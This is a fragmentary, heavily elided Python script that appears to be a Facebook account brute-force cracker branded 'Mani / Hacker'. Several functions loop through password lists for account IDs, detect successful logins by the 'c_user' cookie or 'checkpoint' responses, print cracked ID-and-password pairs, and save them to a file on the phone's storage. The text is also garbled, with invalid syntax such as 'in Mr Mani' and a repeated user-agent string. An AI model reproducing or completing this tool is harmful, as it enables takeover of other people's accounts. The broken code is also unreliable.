...
def fia():    
			...
			print('\x1b[1;91m>>> Mani TEAM  VERSION :\x1b[1;92m 1.1 ')
...
def mmm(ids,names,passlist):
	...
	sys.stdout.write('\r\r\033[1;37m[Mani / Hacker] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				...
				print('\r\r\033[1;31m[Mani-CP] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					...
					print('\r\r\x1b[1;92m[Mani-OK] '+ids+' | '+pas+'\033[1;97m')
...
def ffb(ids,names,passlist):
	...
	sys.stdout.write('\r\r\033[1;37m[Mani / Hacker] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				...
				print('\r\r\033[1;32m[Mani-OK] %s | %s'%(ids,pas))
			...
			elif 'checkpoint' in Mr Mani:

				if 'y' in pcp:

					print('\r\r\x1b[38;5;208m[Mani-OKCP] '+ids+' | '+pas+'\033[1;97m')

					

					open('/sdcard/Mani-Otxt', 'a').write(ids+'|'+pas+'\n')
...
def fcrack(uid,pwx,tl):
	...
	try:
		...
		for ps in pwx:
			...
			sys.stdout.write(f'\r [\033[1;97mMani / Hacker\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
    ...
    'user-agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0',}
			...
			if 'c_user' in log_cookies:
				...
				print('\33[38;5;208m[Mani-CP] '+cid+' | '+ps+'\033[1;32m')
				...
				print('\x1b[1;92m[Mani-OK] '+cid+' | '+ps+'\33[0;97m')
...
Mozilla/5.0 (Windows NT 6.3; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0Mozilla/5.0 (Windows NT 6.3; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0Mozilla/5.0 (Windows NT 6.3; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0
